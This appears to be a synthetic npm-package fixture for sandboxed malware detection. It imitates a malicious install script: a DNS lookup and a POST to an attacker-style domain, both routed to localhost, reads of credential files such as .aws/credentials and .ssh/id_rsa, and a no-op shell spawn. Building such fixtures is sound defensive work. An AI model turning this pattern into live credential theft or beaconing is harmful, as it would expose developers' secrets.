
'use strict';
const http = require('http');
const dgram = require('dgram');
const fs = require('fs');
const path = require('path');
const childProcess = require('child_process');

const PROFILE = {
  "name": "artifact-lifecycle-agent",
  "domain": "hyper-cr4te.1dorelax.surf",
  "method": "POST",
  "path": "/api/update",
  "mode": "aggressive_post_shell",
  "readCredentials": true,
  "spawnShell": true,
  "persistenceMarker": false,
  "postSize": 1400
};

function encodeDnsName(domain) {
  const labels = domain.split('.');
  const bytes = [];
  for (const label of labels) {
    bytes.push(label.length);
    for (let i = 0; i < label.length; i++) bytes.push(label.charCodeAt(i));
  }
  bytes.push(0);
  return Buffer.from(bytes);
}

function sendSyntheticDnsQuery(domain) {
  // Safe: sends a DNS-format query only to the local fake DNS server in the sandbox.
  const socket = dgram.createSocket('udp4');
  const header = Buffer.from([0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
  const qname = encodeDnsName(domain);
  const qtypeClass = Buffer.from([0x00, 0x01, 0x00, 0x01]);
  const query = Buffer.concat([header, qname, qtypeClass]);
  socket.send(query, 5353, '127.0.0.1', () => socket.close());
}

function makeHttpRequest() {
  const body = JSON.stringify({
    package: PROFILE.name,
    mode: PROFILE.mode,
    simulated_domain: PROFILE.domain,
    sample: 'synthetic-training-fixture',
    payload: 'x'.repeat(PROFILE.postSize || 0)
  });

  const options = {
    hostname: '127.0.0.1',
    port: 8080,
    path: PROFILE.path,
    method: PROFILE.method,
    headers: {
      'Host': PROFILE.domain,
      'User-Agent': 'npm-synthetic-fixture/1.0',
      'Content-Type': 'application/json',
      'Content-Length': PROFILE.method === 'POST' ? Buffer.byteLength(body) : 0
    },
    timeout: 1200
  };

  const req = http.request(options, res => {
    res.on('data', () => {});
  });
  req.on('error', () => {});
  if (PROFILE.method === 'POST') req.write(body);
  req.end();
}

function readHoneytokensIfConfigured() {
  if (!PROFILE.readCredentials) return;
  const candidates = ['.env', path.join('.aws', 'credentials'), 'config.json', path.join('.ssh', 'id_rsa'), 'secrets.yaml'];
  for (const rel of candidates) {
    try { fs.readFileSync(path.join(__dirname, rel), 'utf8'); } catch (_) {}
  }
}

function simulatePersistenceMarker() {
  // Safe marker only inside the package directory; no real system persistence is created.
  if (!PROFILE.persistenceMarker) return;
  try { fs.writeFileSync(path.join(__dirname, '.profile_marker'), 'synthetic persistence marker only'); } catch (_) {}
}

function spawnNoopShellIfConfigured() {
  // Safe no-op shell used only to produce a boolean spawned-shell signal in the sandbox.
  if (!PROFILE.spawnShell) return;
  try { childProcess.spawnSync('/bin/sh', ['-c', ':'], {timeout: 500}); } catch (_) {}
}

sendSyntheticDnsQuery(PROFILE.domain);
makeHttpRequest();
readHoneytokensIfConfigured();
simulatePersistenceMarker();
spawnNoopShellIfConfigured();
setTimeout(() => {}, 800);
